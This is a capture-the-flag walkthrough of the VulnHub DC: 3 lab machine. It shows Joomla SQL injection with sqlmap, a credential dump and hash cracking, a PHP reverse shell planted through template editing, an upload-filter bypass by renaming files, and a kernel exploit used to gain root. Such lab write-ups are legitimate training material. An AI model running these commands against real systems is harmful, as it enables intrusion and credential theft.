@@ -1,0 +1,253 @@
+I"&U<p><strong>DC: 3</strong> is a challenge posted on <a href="https://www.vulnhub.com/entry/dc-3,312/">VulnHub</a> created by <a href="https://www.vulnhub.com/author/dcau,610/">DCAU</a>. This is a write-up of my experience solving this awesome CTF challenge.</p>
+
+<p>With my Attack Machine (<strong>Kali Linux</strong>) and Victim Machine (<strong>DC: 3</strong>) set up and running, I decided to get down to solving this challenge.</p>
+
+<blockquote>
+  <p>Read more about my set up and environment <a href="https://diaryof0x41.wordpress.com/2019/05/25/entry-0x01-my-first-post/">here</a></p>
+</blockquote>
+
+<p>I decided to start my journey with <code class="language-plaintext highlighter-rouge">netdiscover</code> to complete the <em>host discovery</em> phase as follows: <code class="language-plaintext highlighter-rouge">netdiscover -r 192.168.56.0/24</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-1.00.07-pm.png" alt="Screen Shot 2019-06-03 at 1.00.07 PM.png" /></p>
+
+<p>Great, the Victim Machine is <code class="language-plaintext highlighter-rouge">192.168.56.101</code>. Let’s continue!</p>
+
+<p>For the next step, I decided to run an <code class="language-plaintext highlighter-rouge">nmap</code> scan to determine open ports and services using the command: <code class="language-plaintext highlighter-rouge">nmap -sV -F 192.168.56.101</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-1.02.48-pm.png" alt="Screen Shot 2019-06-03 at 1.02.48 PM.png" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">nmap</code> scan revealed that port <code class="language-plaintext highlighter-rouge">80</code> was open. Time to hit the browser!</p>
+
+<blockquote>
+  <p>Pro-tip: if you want to stay in the <em>flow</em> of using the terminal, type in <code class="language-plaintext highlighter-rouge">firefox http://192.168.56.101</code></p>
+</blockquote>
+
+<p><img src="images/screen-shot-2019-06-03-at-1.05.11-pm.png" alt="Screen Shot 2019-06-03 at 1.05.11 PM.png" /></p>
+
+<p>Cool, a webpage with a message from @DCAU!</p>
+
+<p>I decided to go ahead with <code class="language-plaintext highlighter-rouge">dirb</code> to get a feel of the website and its directories using the command: <code class="language-plaintext highlighter-rouge">dirb http://192.168.56.101</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-1.09.17-pm.png" alt="Screen Shot 2019-06-03 at 1.09.17 PM.png" /></p>
+
+<p>Wow! That’s a lot of URLs to check. However, the <code class="language-plaintext highlighter-rouge">/administrator</code> path caught my attention. I decided to check it out - <code class="language-plaintext highlighter-rouge">http://192.168.56.101/administrator</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-1.11.38-pm.png" alt="Screen Shot 2019-06-03 at 1.11.38 PM.png" /></p>
+
+<p>Joomla!</p>
+
+<p>After I ran <code class="language-plaintext highlighter-rouge">dirb</code>, I decided to run <code class="language-plaintext highlighter-rouge">nikto</code> just to be sure that I did not miss anything important. The command is: <code class="language-plaintext highlighter-rouge">nikto -h http://192.168.56.101</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-1.36.51-pm.png" alt="Screen Shot 2019-06-03 at 1.36.51 PM.png" /></p>
+
+<p>Okay. Now, I realized that I was working with a Joomla-based web application. Are there any specific tools to enumerate and find vulnerabilities? Is there something like <code class="language-plaintext highlighter-rouge">wpscan</code> for WordPress available for Joomla?</p>
+
+<p>I needed to do my research.</p>
+
+<p>I came across an interesting tool called <a href="https://tools.kali.org/web-applications/joomscan">JoomScan</a> - a Joomla Vulnerability Scanner. It is available on Kali Linux so I decided to give it a test run with our Joomla website using the command: <code class="language-plaintext highlighter-rouge">joomscan -url http://192.168.56.101 -enumerate-components</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-2.15.03-pm.png" alt="Screen Shot 2019-06-03 at 2.15.03 PM.png" /></p>
+
+<p>Hmm, nothing out of the blue. The useful information is the Joomla version - <code class="language-plaintext highlighter-rouge">3.7.0</code>.</p>
+
+<p>I decided to fire up <code class="language-plaintext highlighter-rouge">searchsploit</code> to check for any exploits for this version of Joomla using the command: <code class="language-plaintext highlighter-rouge">searchsploit joomla 3.7.0</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-2.17.47-pm.png" alt="Screen Shot 2019-06-03 at 2.17.47 PM" /></p>
+
+<p>Woohoo! I was excited to give it a shot. First, I decided to <em>copy</em> the <code class="language-plaintext highlighter-rouge">.TXT</code> file to my current directory using the command: <code class="language-plaintext highlighter-rouge">searchsploit -m 42033</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-2.19.31-pm.png" alt="Screen Shot 2019-06-03 at 2.19.31 PM.png" /></p>
+
+<p>Nice! Let’s have a look using the trusty <code class="language-plaintext highlighter-rouge">cat</code> command: <code class="language-plaintext highlighter-rouge">cat 42033.txt</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-2.21.16-pm.png" alt="Screen Shot 2019-06-03 at 2.21.16 PM.png" /></p>
+
+<p>Interesting. Basically, we need to run the <code class="language-plaintext highlighter-rouge">sqlmap</code> command to proceed with the <em>injection</em>. Obviously, in our case, I needed to change <code class="language-plaintext highlighter-rouge">localhost</code> to <code class="language-plaintext highlighter-rouge">192.168.56.101</code> before running the command:</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-2.24.19-pm.png" alt="Screen Shot 2019-06-03 at 2.24.19 PM.png" /></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-2.25.20-pm.png" alt="Screen Shot 2019-06-03 at 2.25.20 PM.png" /></p>
+
+<p>Super! <code class="language-plaintext highlighter-rouge">sqlmap</code> got us the database names. The most interesting one is <code class="language-plaintext highlighter-rouge">joomladb</code>. I decided to get table names as follows: <code class="language-plaintext highlighter-rouge">sqlmap -u "http://192.168.56.101/index.php option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --tables -D joomladb</code></p>
+
+<p>The only change from the previous command to this is that we mention: <code class="language-plaintext highlighter-rouge">--tables -D joomladb</code> which is a way of saying that we want a list of <em>tables</em> from the database <code class="language-plaintext highlighter-rouge">joomladb</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-2.31.04-pm.png" alt="Screen Shot 2019-06-03 at 2.31.04 PM.png" /></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-2.31.59-pm.png" alt="Screen Shot 2019-06-03 at 2.31.59 PM.png" /></p>
+
+<p>The interesting thing is that we got a list of <strong>76</strong> tables in the <code class="language-plaintext highlighter-rouge">joomladb</code> database. For me, the crucial table is <code class="language-plaintext highlighter-rouge">#__users</code>. I decided to get the columns in that table using the command: <code class="language-plaintext highlighter-rouge">sqlmap -u "http://192.168.56.101/index.php option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --columns -D joomladb -T "#__users"</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-3.44.11-pm.png" alt="Screen Shot 2019-06-03 at 3.44.11 PM.png" /></p>
+
+<p>For some reason, <code class="language-plaintext highlighter-rouge">sqlmap</code> gave a <strong>warning</strong> saying <code class="language-plaintext highlighter-rouge">unable to retrieve column names for table '#__users' in database 'joomladb'</code> For this reason, I gave <code class="language-plaintext highlighter-rouge">y[es]</code> to the question <code class="language-plaintext highlighter-rouge">Do you want to use common column existence check? [y/N/q]</code></p>
+
+<p>It got names of <strong>6</strong> columns in the table <code class="language-plaintext highlighter-rouge">#__users</code> in the database <code class="language-plaintext highlighter-rouge">joomladb</code>. I was super interested in the <code class="language-plaintext highlighter-rouge">email</code>, <code class="language-plaintext highlighter-rouge">password</code>, and <code class="language-plaintext highlighter-rouge">username</code> columns. Time to see the data!</p>
+
+<p>I modified the command as follows: <code class="language-plaintext highlighter-rouge">sqlmap -u "http://192.168.56.101/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" -D joomladb -T "#__users" -C email,password,username --dump</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-3.55.47-pm.png" alt="Screen Shot 2019-06-03 at 3.55.47 PM.png" /></p>
+
+<p>Woah! <code class="language-plaintext highlighter-rouge">admin</code> credentials? Gold!</p>
+
+<p>The data dumped includes:</p>
+
+<ul>
+  <li>email: <code class="language-plaintext highlighter-rouge">freddy@norealaddress.net</code></li>
+  <li>password: <code class="language-plaintext highlighter-rouge">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></li>
+  <li>username: <code class="language-plaintext highlighter-rouge">admin</code></li>
+</ul>
+
+<p>What’s next? We need to break the <em>hash</em>. But first, we need to identify the hash type. I decided to proceed with <a href="https://www.tunnelsup.com/hash-analyzer/">this</a> trusty website:</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.00.10-pm.png" alt="Screen Shot 2019-06-03 at 4.00.10 PM" /></p>
+
+<p>Cool - <code class="language-plaintext highlighter-rouge">bcrypt</code></p>
+
+<p>I decided to use <code class="language-plaintext highlighter-rouge">hashcat</code> to get the password as follows: <code class="language-plaintext highlighter-rouge">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --force</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.11.00-pm.png" alt="Screen Shot 2019-06-03 at 4.11.00 PM.png" /></p>
+
+<p>Awesome! We got the password for <code class="language-plaintext highlighter-rouge">admin</code> - <code class="language-plaintext highlighter-rouge">snoopy</code>. Back to the browser!</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.13.45-pm.png" alt="Screen Shot 2019-06-03 at 4.13.45 PM.png" /></p>
+
+<p>Good, now I wanted to get access to the shell… somehow.</p>
+
+<p>To achieve that, I decided to explore the Joomla interface. With my experience with WordPress, it is usually extensions, plugins, or modules that allow us to somehow <em>inject</em> PHP code which can help us open a reverse shell.</p>
+
+<p>In my journey, I came across an interesting page - <code class="language-plaintext highlighter-rouge">Extensions &gt; Templates</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.17.15-pm.png" alt="Screen Shot 2019-06-03 at 4.17.15 PM.png" /></p>
+
+<p>I opened<code class="language-plaintext highlighter-rouge">Templates</code> in the left menu…</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.19.05-pm.png" alt="Screen Shot 2019-06-03 at 4.19.05 PM.png" /></p>
+
+<p>Interesting. We can <em>preview</em> these templates as well as their files. What about the option to edit? I clicked on the first one - <code class="language-plaintext highlighter-rouge">Beez3 Details and Files</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.20.30-pm.png" alt="Screen Shot 2019-06-03 at 4.20.30 PM.png" /></p>
+
+<p>Yeah - PHP files!</p>
+
+<p>Now, I decided to edit <code class="language-plaintext highlighter-rouge">index.php</code> and replace its contents with the code for <code class="language-plaintext highlighter-rouge">php-reverse-shell</code>.  Back to the terminal!</p>
+
+<p>The first step is to locate the <code class="language-plaintext highlighter-rouge">php-reverse-shell</code> code in Kali Linux and modify it to our configuration. I decided to use my trusty <code class="language-plaintext highlighter-rouge">vim</code> for this purpose…</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.24.47-pm.png" alt="Screen Shot 2019-06-03 at 4.24.47 PM.png" /></p>
+
+<p>I changed the variables - <code class="language-plaintext highlighter-rouge">$ip</code> and <code class="language-plaintext highlighter-rouge">$port</code> to my Kali Linux IP address and a custom port number.</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.28.06-pm.png" alt="Screen Shot 2019-06-03 at 4.28.06 PM.png" /></p>
+
+<p>Great, time to create a listener using the trusty netcat: <code class="language-plaintext highlighter-rouge">nc -lvp 7777</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.30.20-pm.png" alt="Screen Shot 2019-06-03 at 4.30.20 PM.png" /></p>
+
+<p>Time to trigger the <code class="language-plaintext highlighter-rouge">index.php</code> of the <strong>Beez3</strong> template! Once I saved the edited <code class="language-plaintext highlighter-rouge">index.php</code> file, I clicked on <code class="language-plaintext highlighter-rouge">Template Preview</code>…</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.32.32-pm.png" alt="Screen Shot 2019-06-03 at 4.32.32 PM.png" /></p>
+
+<p>There’s nothing? Doesn’t matter… I got shell!</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.32.17-pm.png" alt="Screen Shot 2019-06-03 at 4.32.17 PM.png" /></p>
+
+<p>I really wanted a TTY shell… something easier to work with. A great technique I picked up is as follows: <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash");'</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.33.59-pm.png" alt="Screen Shot 2019-06-03 at 4.33.59 PM.png" /></p>
+
+<p>There we go!</p>
+
+<p>Okay, time for privilege escalation. The tough one!</p>
+
+<p>I decided to try exploiting SUID executables - ones which can be executed with <code class="language-plaintext highlighter-rouge">root</code> privileges. The command <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2&gt;/dev/null</code> prints a list of executables with the SUID bit set.</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-4.41.58-pm.png" alt="Screen Shot 2019-06-03 at 4.41.58 PM.png" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">/bin/ntfs-3g</code> looked interesting. Some <a href="https://www.rapid7.com/db/modules/exploit/linux/local/ntfs3g_priv_esc">Googling</a> revealed that it is possible to escalate privileges with <code class="language-plaintext highlighter-rouge">ntfs-3g</code>.</p>
+
+<p>I immediately looked up any available exploits using <code class="language-plaintext highlighter-rouge">searchsploit</code> using the command: <code class="language-plaintext highlighter-rouge">searchsploit ntfs 3g</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-7.20.44-pm.png" alt="Screen Shot 2019-06-03 at 7.20.44 PM.png" /></p>
+
+<p>I was excited but both these exploits never worked. I had to find another way escalate my privileges on this machine. Kernel exploits perhaps?</p>
+
+<p>I decided to go down the Linux kernel exploit path. First, I needed some context so I ran 2 useful commands:</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">uname -a</code> which prints <strong>all</strong> system information</li>
+  <li><code class="language-plaintext highlighter-rouge">cat /etc/os-release</code> which contains specific Linux distro information</li>
+</ol>
+
+<p><img src="images/screen-shot-2019-06-03-at-7.29.53-pm.png" alt="Screen Shot 2019-06-03 at 7.29.53 PM.png" /></p>
+
+<p>Cool, <code class="language-plaintext highlighter-rouge">Ubuntu 16.04</code>. Time to look for kernel exploits!</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-7.31.09-pm.png" alt="Screen Shot 2019-06-03 at 7.31.09 PM.png" /></p>
+
+<p>A quick search on <code class="language-plaintext highlighter-rouge">searchsploit</code> revealed a decent list of exploits. What’s next is a ton of trial-and-error…</p>
+
+<p>One of the interesting exploits on this list is <code class="language-plaintext highlighter-rouge">Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation</code></p>
+
+<p>I decided to give it a try as follows: <code class="language-plaintext highlighter-rouge">searchsploit -m 39772</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-7.39.47-pm.png" alt="Screen Shot 2019-06-03 at 7.39.47 PM.png" /></p>
+
+<p>Looking into the <code class="language-plaintext highlighter-rouge">.TXT</code> file reveals that we need to first download the exploit using <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">this link</a>. I decided to use <code class="language-plaintext highlighter-rouge">wget</code> for this purpose. Make sure your network settings support downloading from the Internet. I had to change mine to NAT temporarily.</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-7.43.29-pm.png" alt="Screen Shot 2019-06-03 at 7.43.29 PM.png" /></p>
+
+<p>Great! <code class="language-plaintext highlighter-rouge">39772.zip</code> needs to be transferred to the Victim Machine (DC3). I decided to unzip the files and have a look.</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-7.48.41-pm.png" alt="Screen Shot 2019-06-03 at 7.48.41 PM.png" /></p>
+
+<p>As per the exploit’s <a href="https://www.exploit-db.com/exploits/39772">ExploitDB webpage</a>, we are interested in <code class="language-plaintext highlighter-rouge">exploit.tar</code> Next, I ran the command: <code class="language-plaintext highlighter-rouge">tar -xvf exploit.tar</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-7.50.38-pm.png" alt="Screen Shot 2019-06-03 at 7.50.38 PM.png" /></p>
+
+<p>Lots of files which needs to be transferred to the Victim Machine! I decided to achieve this using the Joomla web interface itself. This simply involves uploading the files as images/media.</p>
+
+<p>I navigated to the blog post on the Joomla website using the browser.</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-8.19.49-pm.png" alt="Screen Shot 2019-06-03 at 8.19.49 PM.png" /></p>
+
+<p>Great, I just needed to upload the <strong>4</strong> files using this interface. However, Joomla is smart and stopped me from uploading files with the extensions <code class="language-plaintext highlighter-rouge">.c</code> and <code class="language-plaintext highlighter-rouge">.sh</code>. I needed to find an alternative route.</p>
+
+<p>What worked was <code class="language-plaintext highlighter-rouge">.TXT</code>. I renamed all the files with the <code class="language-plaintext highlighter-rouge">.TXT</code>  extension using the <code class="language-plaintext highlighter-rouge">mv</code> command as follows: <code class="language-plaintext highlighter-rouge">mv &lt;old_file_name&gt; &lt;new_file_name&gt;</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-8.15.26-pm.png" alt="Screen Shot 2019-06-03 at 8.15.26 PM.png" /></p>
+
+<p>The uploads worked!</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-8.19.12-pm.png" alt="Screen Shot 2019-06-03 at 8.19.12 PM" /></p>
+
+<p>Back to the reverse shell!</p>
+
+<p>I navigated to the <code class="language-plaintext highlighter-rouge">/var/www/html/images</code> folder and renamed all the files back to their original extensions. Again, using the <code class="language-plaintext highlighter-rouge">mv</code> command as seen above.</p>
+
+<p><img src="images/screen-shot-2019-06-03-at-8.16.18-pm.png" alt="Screen Shot 2019-06-03 at 8.16.18 PM.png" /></p>
+
+<p>According to the exploit’s instructions, the first step is to run <code class="language-plaintext highlighter-rouge">compile.sh</code> as follows: <code class="language-plaintext highlighter-rouge">./compile.sh</code></p>
+
+<p>But first… I needed to set the right executable permissions using the command: <code class="language-plaintext highlighter-rouge">chmod +x compile.sh</code></p>
+
+<p>This created <code class="language-plaintext highlighter-rouge">doubleput</code> which is the next program to be executed (as per the exploit’s instructions). I set the right executable permissions using <code class="language-plaintext highlighter-rouge">chmod +x doubleput</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-8.17.20-pm.png" alt="Screen Shot 2019-06-03 at 8.17.20 PM.png" /></p>
+
+<p>Woohoo! <code class="language-plaintext highlighter-rouge">root</code> is what I am!</p>
+
+<p>Time to get the flag inside <code class="language-plaintext highlighter-rouge">/root/</code> which was named <code class="language-plaintext highlighter-rouge">the-flag.txt</code></p>
+
+<p><img src="images/screen-shot-2019-06-03-at-8.17.45-pm.png" alt="Screen Shot 2019-06-03 at 8.17.45 PM.png" /></p>
+
+<p>Finally! Awesome!</p>
+
+<h3 id="my-thoughts">My Thoughts</h3>
+
+<p>That was a really interesting challenge! Props to @DCAU for coming up with a great challenge revolving around Joomla.</p>
+
+<p>I really learnt a lot about Joomla and better understood the usage of Linux kernel exploits for <em>privilege escalation</em> in CTFs. TL;DR - be ready for tons of trial and error.</p>
+
+<p>If you enjoyed reading this, please check out my <a href="https://diaryof0x41.wordpress.com/2019/05/29/vulnhub-dc-6-walkthrough/">DC: 6 walkthrough</a> which is another challenge by @DCAU in the <a href="https://www.vulnhub.com/series/dc,199/">DC series</a>.</p>
+:ET
